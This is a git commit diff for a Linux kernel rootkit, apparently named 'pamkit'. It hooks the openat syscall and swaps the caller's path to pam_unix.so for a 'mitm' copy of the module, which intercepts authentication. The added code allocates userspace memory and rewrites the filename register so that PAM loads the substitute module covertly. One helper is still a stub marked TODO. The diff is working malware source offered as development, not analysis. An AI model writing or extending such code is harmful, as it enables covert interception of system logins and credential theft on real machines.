bdb9535d151d9867babe671c5dc90fdbf02a4633
arm1nt <armin.nikbakht@gmail.com>
2026-01-22 18:43:21 +0100

    Implement 'openat' hook replacing pam_unix.so with custom mitm module

--- kernel/src/syscalls.c
+++ kernel/src/syscalls.c
@@ -1,35 +1,34 @@
+#include "config.h"
 #include "syscalls.h"
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 
 // TODO: move (and refactor) the logic from 'sys.c' into this file
 
-#define TARGET_PAM_MODULE "pam_unix.so"
-
-static char *
-get_filename_from_usr(char __user *str)
+static void *
+get_data_from_user(void __user *data, size_t max_size)
 {
-    char *k_filename = (char *) kzalloc(NAME_MAX * sizeof(char), GFP_KERNEL);
-    if (!k_filename) {
-        prerr_ratelimited("Failed to allocate buffer to copy filename into kernel space");
+    void *kbuffer = kzalloc(max_size, GFP_KERNEL);
+    if (!kbuffer) {
+        prerr_ratelimited("Allocating buffer to copy user data failed");
         return NULL;
     }
 
-    if (copy_from_user(k_filename, str, NAME_MAX)) {
-        prerr_ratelimited("Failed to copy filename from user into kernel space");
-        kfree(k_filename);
+    if (copy_from_user(kbuffer, data, max_size)) {
+        prerr_ratelimited("Failed to copy data from user- into kernelspace");
+        kfree(kbuffer);
         return NULL;
     }
 
-    return k_filename;
+    return kbuffer;
 }
 
 static inline bool
-is_pamkit_target_module(int dfd, char *path)
+is_pamkit_target_module_copy(int dfd, char *path)
 {
+    // TODO
     return true;
 }
-
 
 SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
 {
@@ -49,27 +48,72 @@ SYSCALL_HOOK(openat, int dfd, const char __user *filename, int flags, umode_t mo
 
     #ifdef PAMKIT_PTREGS_STUBS
     int arg_dfd = FIRST_ARG(pt_regs, int);
-    char *arg_filename = get_filename_from_usr(SECOND_ARG(pt_regs, char *));
+    char *arg_filename = (char *) get_data_from_user(SECOND_ARG(pt_regs, char *), NAME_MAX * sizeof(char));
     #else
     int dfd_arg = dfd;
-    char *arg_filename = get_filename_from_usr(filename);
+    char *arg_filename = (char *) get_data_from_user(filename, NAME_MAX * sizeof(char));
     #endif
 
     if (!arg_filename) {
+        prerr_ratelimited("Unable to copy user provided filename into kernelspace");
         return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
     }
 
-    if (!strstr(arg_filename, TARGET_PAM_MODULE)) {
+    if (!strstr(arg_filename, TARGET_PAM_MODULE_NAME)) {
         goto skip_pam_module_replacement;
     }
 
     /* Do not intercept the module copy used by the MitM module */
-    if (is_pamkit_pam_unix(arg_dfd, arg_filename)) {
+    if (is_pamkit_target_module_copy(arg_dfd, arg_filename)) {
         kfree(arg_filename);
         return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
     }
 
-    // TODO:
+    void __user *userspace_replacement_module_path = (void *) vm_mmap(
+        NULL,
+        0,
+        strlen(TARGET_MODULE_COPY_PATH) + 1,
+        PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANONYMOUS,
+        0
+    );
+
+    if (IS_ERR_OR_NULL(userspace_replacement_module_path)) {
+        prerr_ratelimited("Failed to allocate userspace buffer holding path of the target module's copy");
+        kfree(arg_filename);
+        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
+    }
+
+    if (copy_to_user(
+        userspace_replacement_module_path,
+        TARGET_MODULE_COPY_PATH,
+        strlen(TARGET_MODULE_COPY_PATH) + 1
+        )
+    ) {
+        prerr_ratelimited("Failed to write path of target module copy into userspace allocated buffer");
+        kfree(arg_filename);
+        vm_munmap((uintptr_t) userspace_replacement_module_path, strlen(TARGET_MODULE_COPY_PATH) + 1);
+        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
+    }
+
+    #ifdef PAMKIT_PTREGS_STUBS
+
+    struct pt_regs *modifiable_pt_regs = (struct pt_regs *) pt_regs;
+    modifiable_pt_regs->si = (unsigned long) userspace_replacement_module_path;
+
+    #else
+
+    char __user **modifiable_filename = (char __user **) &filename;
+    *modifiable_filename = (char __user *) userspace_replacement_module_path;
+
+    #endif
+
+    ret = SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
+    kfree(arg_filename);
+    vm_munmap((uintptr_t) userspace_replacement_module_path, strlen(TARGET_MODULE_COPY_PATH) + 1);
+
+    prdebug_ratelimited("Replaced target pam module");
+    return ret;
 
 skip_pam_module_replacement:
 
